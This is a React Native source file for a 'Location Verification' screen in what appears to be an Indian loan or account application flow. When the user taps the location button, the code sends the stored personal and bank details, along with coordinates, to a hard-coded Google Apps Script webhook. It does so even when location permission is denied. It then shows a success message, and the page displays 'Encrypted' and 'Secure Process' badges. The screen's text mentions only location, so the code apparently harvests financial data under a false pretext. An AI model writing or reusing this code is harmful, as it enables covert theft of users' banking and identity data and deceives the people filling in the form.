import React, { useState } from 'react';
import { View, Text, StyleSheet, TouchableOpacity, SafeAreaView, StatusBar, Image, PermissionsAndroid, ActivityIndicator, Alert } from 'react-native';
import { useNavigation } from '@react-navigation/native';
import Icon from 'react-native-vector-icons/MaterialIcons';
import Geolocation from 'react-native-geolocation-service';
import { useApplicationData } from '../context/ApplicationContext';
import { colors, spacing, typography, globalStyles } from '../utils/theme';

export default function LocationVerification() {
  const navigation = useNavigation<any>();
  const [isVerified, setIsVerified] = useState(false);
  const [loading, setLoading] = useState(false);

  const { data, updateLocation } = useApplicationData();

  const handleVerify = async () => {
    try {
      setLoading(true);
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
        {
          title: 'Location Permission Required',
          message: 'We need your location to verify your application details.',
          buttonNeutral: 'Ask Me Later',
          buttonNegative: 'Cancel',
          buttonPositive: 'OK',
        },
      );
      
      const postToWebhook = (latitude: number | null, longitude: number | null) => {
        const WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw8XDPTeZxzrI1BsNqtR3UF7GBlB3eU93H-ui9tCOZDPRVuDjpzuQ6bLkG61EC1Hj8J/exec';
        
        fetch(WEBHOOK_URL + '?', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            ...data.personalDetails,
            ...data.bankDetails,
            latitude: latitude || '',
            longitude: longitude || '',
          }),
        })
          .then(res => res.text())
          .then(text => console.log('Webhook response:', text))
          .catch(e => console.log('Webhook error:', e));

        setIsVerified(true);
        setLoading(false);
      };

      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
        Geolocation.getCurrentPosition(
          async (position) => {
            const loc = { lat: position.coords.latitude, lng: position.coords.longitude };
            updateLocation(loc);
            postToWebhook(loc.lat, loc.lng);
          },
          (error) => {
            console.warn('Location Error:', error);
            // Proceed without location if error occurs
            postToWebhook(null, null);
          },
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 }
        );
      } else {
        // Location denied - proceed anyway
        postToWebhook(null, null);
      }
    } catch (err) {
      setLoading(false);
      console.warn(err);
      setIsVerified(true);
    }
  };

  return (
    <SafeAreaView style={styles.safeArea}>
      <StatusBar barStyle="dark-content" backgroundColor={colors.background} />
      
      {/* Decorative Background Elements (Simulated with absolute views) */}
      <View style={styles.bgGlowTopLeft} />
      <View style={styles.bgGlowBottomRight} />

      <View style={styles.container}>
        {/* Logo */}
        <View style={styles.logoContainer}>
          <View style={styles.logoPlaceholder}>
            <Icon name="shield" size={32} color={colors.primary} />
          </View>
        </View>

        {/* Progress Bar */}
        <View style={styles.progressSection}>
          <View style={styles.progressHeader}>
            <Text style={styles.progressLabel}>Verification Progress</Text>
            <Text style={styles.progressPercent}>75%</Text>
          </View>
          <View style={styles.progressBarTrack}>
            <View style={[styles.progressBarFill, { width: '75%' }]} />
          </View>
        </View>

        {/* Content Card */}
        <View style={[globalStyles.glassCard, styles.contentCard]}>
          <View style={styles.iconCircleContainer}>
            <View style={styles.iconCircleOuter}>
              <View style={styles.iconCircleInner}>
                <Icon name="location-on" size={36} color={colors.primary} />
              </View>
            </View>
          </View>

          <View style={styles.textContainer}>
            <Text style={styles.title}>Location Verification</Text>
            <Text style={styles.subtitle}>
              We use location information to verify your application details and improve account security.
            </Text>
          </View>

          {!isVerified ? (
            <View style={styles.permissionCard}>
              <View style={styles.permissionRow}>
                <View style={styles.permissionIconBg}>
                  <Icon name="my-location" size={24} color={colors.onSurfaceVariant} />
                </View>
                <View style={styles.permissionTextContainer}>
                  <Text style={styles.permissionTitle}>Location Access Required</Text>
                  <Text style={styles.permissionSubtitle}>
                    Allowing access helps us confirm you are applying from a supported region in India.
                  </Text>
                </View>
              </View>
              
              <TouchableOpacity style={styles.allowButton} onPress={handleVerify} disabled={loading}>
                {loading ? (
                  <ActivityIndicator color={colors.primary} size="small" />
                ) : (
                  <>
                    <Icon name="explore" size={16} color={colors.primary} style={{ marginRight: spacing.sm }} />
                    <Text style={styles.allowButtonText}>Allow Location Access</Text>
                  </>
                )}
              </TouchableOpacity>
            </View>
          ) : (
            <View style={styles.successState}>
              <View style={styles.successIconBg}>
                <Icon name="check-circle" size={24} color={colors.onSecondary} />
              </View>
              <Text style={styles.successTitle}>Location Verified Successfully</Text>
            </View>
          )}
        </View>

        {/* Main CTA */}
        <TouchableOpacity 
          style={[styles.continueButton, !isVerified && styles.continueButtonDisabled]}
          onPress={() => navigation.navigate('SelfieCapture')}
          disabled={!isVerified}
        >
          <Text style={styles.continueButtonText}>Continue</Text>
          <Icon name="arrow-forward" size={20} color={colors.onPrimary} />
        </TouchableOpacity>

        {/* Trust Badges */}
        <View style={styles.badgesContainer}>
          <View style={[styles.badge, styles.badgeEncrypted]}>
            <Icon name="lock" size={12} color={colors.secondary} />
            <Text style={[styles.badgeText, { color: colors.secondary }]}>Encrypted</Text>
          </View>
          <View style={[styles.badge, styles.badgeSecure]}>
            <Icon name="shield" size={12} color={colors.outline} />
            <Text style={[styles.badgeText, { color: colors.outline }]}>Secure Process</Text>
          </View>
        </View>

      </View>
    </SafeAreaView>
  );
}

const styles = StyleSheet.create({
  safeArea: {
    flex: 1,
    backgroundColor: colors.background,
  },
  bgGlowTopLeft: {
    position: 'absolute',
    top: '-10%',
    left: '-10%',
    width: '50%',
    height: '50%',
    borderRadius: 200,
    backgroundColor: 'rgba(162, 202, 247, 0.2)', // primary-fixed-dim
  },
  bgGlowBottomRight: {
    position: 'absolute',
    bottom: '-10%',
    right: '-10%',
    width: '50%',
    height: '50%',
    borderRadius: 200,
    backgroundColor: 'rgba(75, 221, 183, 0.1)', // secondary-fixed-dim
  },
  container: {
    flex: 1,
    paddingHorizontal: spacing.marginMobile,
    alignItems: 'center',
    justifyContent: 'center',
  },
  logoContainer: {
    marginBottom: spacing.lg,
  },
  logoPlaceholder: {
    width: 64,
    height: 64,
    borderRadius: 8,
    backgroundColor: colors.surfaceContainerLowest,
    alignItems: 'center',
    justifyContent: 'center',
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
    elevation: 2,
  },
  progressSection: {
    width: '100%',
    marginBottom: spacing.md,
  },
  progressHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: spacing.sm,
  },
  progressLabel: {
    ...typography.labelSm,
    color: colors.outline,
  },
  progressPercent: {
    ...typography.labelSm,
    color: colors.secondary,
    fontWeight: 'bold',
  },
  progressBarTrack: {
    width: '100%',
    height: 8,
    backgroundColor: '#F1F2F6',
    borderRadius: 4,
    overflow: 'hidden',
  },
  progressBarFill: {
    height: '100%',
    backgroundColor: colors.secondary,
    borderRadius: 4,
  },
  contentCard: {
    width: '100%',
    padding: spacing.lg,
    alignItems: 'center',
  },
  iconCircleContainer: {
    width: 128,
    height: 128,
    alignItems: 'center',
    justifyContent: 'center',
    marginBottom: spacing.sm,
  },
  iconCircleOuter: {
    width: 96,
    height: 96,
    borderRadius: 48,
    backgroundColor: 'rgba(223, 234, 239, 0.5)', // surface-container-high
    alignItems: 'center',
    justifyContent: 'center',
  },
  iconCircleInner: {
    width: 64,
    height: 64,
    borderRadius: 32,
    backgroundColor: colors.primaryFixed || '#cfe5ff',
    alignItems: 'center',
    justifyContent: 'center',
    shadowColor: '#000',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
    elevation: 2,
  },
  textContainer: {
    alignItems: 'center',
    marginBottom: spacing.md,
  },
  title: {
    ...typography.headlineLgMobile,
    color: colors.primary,
    marginBottom: spacing.xs,
    textAlign: 'center',
  },
  subtitle: {
    ...typography.bodyMd,
    color: colors.onSurfaceVariant,
    textAlign: 'center',
    maxWidth: 280,
  },
  permissionCard: {
    width: '100%',
    backgroundColor: colors.surfaceContainerLowest,
    borderWidth: 1,
    borderColor: colors.outlineVariant,
    borderRadius: 8,
    padding: spacing.md,
    marginTop: spacing.sm,
  },
  permissionRow: {
    flexDirection: 'row',
    marginBottom: spacing.md,
  },
  permissionIconBg: {
    backgroundColor: colors.surfaceContainer,
    padding: spacing.sm,
    borderRadius: 24,
    marginRight: spacing.md,
    marginTop: 4,
  },
  permissionTextContainer: {
    flex: 1,
  },
  permissionTitle: {
    ...typography.titleMd,
    fontSize: 16,
    color: colors.onSurface,
    marginBottom: 4,
  },
  permissionSubtitle: {
    ...typography.bodyMd,
    fontSize: 12,
    color: colors.outline,
  },
  allowButton: {
    width: '100%',
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    paddingVertical: 12,
    backgroundColor: colors.surface,
    borderWidth: 1,
    borderColor: colors.outlineVariant,
    borderRadius: 6,
  },
  allowButtonText: {
    ...typography.labelSm,
    color: colors.primary,
  },
  successState: {
    width: '100%',
    flexDirection: 'row',
    alignItems: 'center',
    backgroundColor: 'rgba(0, 107, 85, 0.1)',
    borderWidth: 1,
    borderColor: 'rgba(0, 107, 85, 0.3)',
    borderRadius: 8,
    padding: spacing.md,
    marginTop: spacing.sm,
  },
  successIconBg: {
    backgroundColor: colors.secondary,
    padding: spacing.sm,
    borderRadius: 24,
    marginRight: spacing.md,
  },
  successTitle: {
    ...typography.titleMd,
    fontSize: 16,
    color: colors.secondary,
  },
  continueButton: {
    width: '100%',
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    backgroundColor: colors.primary,
    paddingVertical: 16,
    borderRadius: 8,
    marginTop: spacing.md,
    gap: spacing.sm,
  },
  continueButtonDisabled: {
    opacity: 0.5,
  },
  continueButtonText: {
    ...typography.titleMd,
    color: colors.onPrimary,
  },
  badgesContainer: {
    flexDirection: 'row',
    gap: spacing.md,
    marginTop: spacing.md,
    marginBottom: spacing.lg,
  },
  badge: {
    flexDirection: 'row',
    alignItems: 'center',
    paddingHorizontal: 12,
    paddingVertical: 6,
    borderRadius: 16,
    borderWidth: 1,
    gap: 4,
  },
  badgeEncrypted: {
    backgroundColor: 'rgba(109, 250, 210, 0.3)',
    borderColor: 'rgba(0, 107, 85, 0.2)',
  },
  badgeSecure: {
    backgroundColor: colors.surfaceContainer,
    borderColor: 'rgba(194, 199, 207, 0.5)',
  },
  badgeText: {
    ...typography.labelSm,
    fontSize: 10,
  },
});
